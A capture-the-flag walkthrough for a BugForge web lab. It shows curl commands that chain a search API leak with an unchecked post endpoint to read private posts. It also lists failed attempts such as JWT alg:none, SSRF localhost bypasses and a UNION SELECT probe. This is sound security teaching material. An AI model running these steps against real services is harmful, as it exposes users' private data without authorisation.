# ottergram-011 - BugForge Lab Walkthrough

**URL:** https://lab-1781118004102-ft0wk9.labs-app.bugforge.io/
**Difficulty:** Easy  
**Vulnerability:** Client-Side Filtering Bypass (Server-Side Information Disclosure)
**Flag:** `bug{q1g2BkBaFBZfWD9ZYSa61JPoEDxQCSN5}`

---

## Summary

Ottergram is an Instagram-like social platform. The `/api/search` endpoint returns all matching posts including posts from private accounts, relying on client-side JS (`results.filter((r) => !r.private)`) to suppress them in the UI. By calling the API directly and then fetching the leaked post UUID via `/api/posts/:id` (which has no privacy enforcement), an attacker reads private post captions - including the flag.

## Tech Stack

- React (CRA), React Router
- Node.js + Express backend
- JWT (HS256) auth
- SQLite database
- Source maps exposed in production build

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `GET /api/search?q=` | Required | Returns private posts without server-side filter |
| `GET /api/posts/:uuid` | Required | No privacy check - returns any post by UUID |
| `GET /api/profile/:username` | Public | Respects private_account flag correctly |
| `POST /api/subscribe` | Required | Free insider tier (business logic bug) |
| `POST /api/profile/avatar/import` | Required | SSRF with filter (localhost blocked) |
| `GET /api/admin/analytics` | Admin only | Role-gated |

## Attack Chain

**Step 1: Register and authenticate**
```bash
curl -s -X POST $TARGET/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker3","email":"h3@test.local","password":"pass123","full_name":"H"}'
# Get token from response
```

**Step 2: Search broadly - observe private post leaking from API**
```bash
curl -s -H "Authorization: Bearer $TOKEN" "$TARGET/api/search?q=a"
# Response includes: {"private":true,"id":"dfb8a6d4-...","user":"kelp_forest","caption":""}
# caption is empty in search response but the ID is exposed
```

**Step 3: Fetch the private post directly**
```bash
curl -s -H "Authorization: Bearer $TOKEN" \
  "$TARGET/api/posts/dfb8a6d4-7f57-4ef4-9790-50edfc27def8"
# Returns full post including caption with the flag
```

## Discovery Notes

- Source maps exposed at `/static/js/main.*.js.map` - full React source extracted
- `Search.js:49`: `results.filter((r) => !r.private)` - client-side only filter
- `PostView.js`: `GET /api/posts/${id}` - no privacy check
- The caption field is stripped/empty in search results but present in the direct post fetch
- Searching for `"bug"` returns the private post confirming the caption contains the flag

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| Mass assignment `role:admin` on register | Stripped server-side | Role field not writable |
| JWT alg:none | Rejected - algorithm verified | Server enforces alg |
| JWT secret brute (rockyou) | No match in common passwords | Secret not weak |
| SSRF localhost bypasses (hex/decimal/octal/IPv6/nip.io) | "host not allowed" | Filter is comprehensive |
| SSRF via httpbin open redirect | 400 Bad Request | Server validates redirect targets too |
| Admin endpoint BAC | Proper role checks throughout | Admin middleware solid |
| X-Forwarded-For header injection | No effect on role | Not IP-gated |
| `PUT /api/admin/users/:id` with user token | 403 | Role check enforced |
| `PUT /api/settings` with role field | "No valid settings provided" | Settings allowlisted |
| Password reset token leak | No accessible debug endpoint | Reset tokens not exposed |
| SQLi in search (`' UNION SELECT`) | Empty result / no error | Parameterized queries |

## Root Causes

- Server returns private posts in search results without filtering - only trusts the client to hide them
- `/api/posts/:uuid` endpoint has no privacy check - any authenticated user can read any post by UUID
- Private post UUID is leaked through the search API response, enabling two-step information disclosure

## CWE / OWASP

- CWE-200: Exposure of Sensitive Information to an Unauthorized Actor
- CWE-602: Client-Side Enforcement of Server-Side Security
- OWASP A01:2021 - Broken Access Control
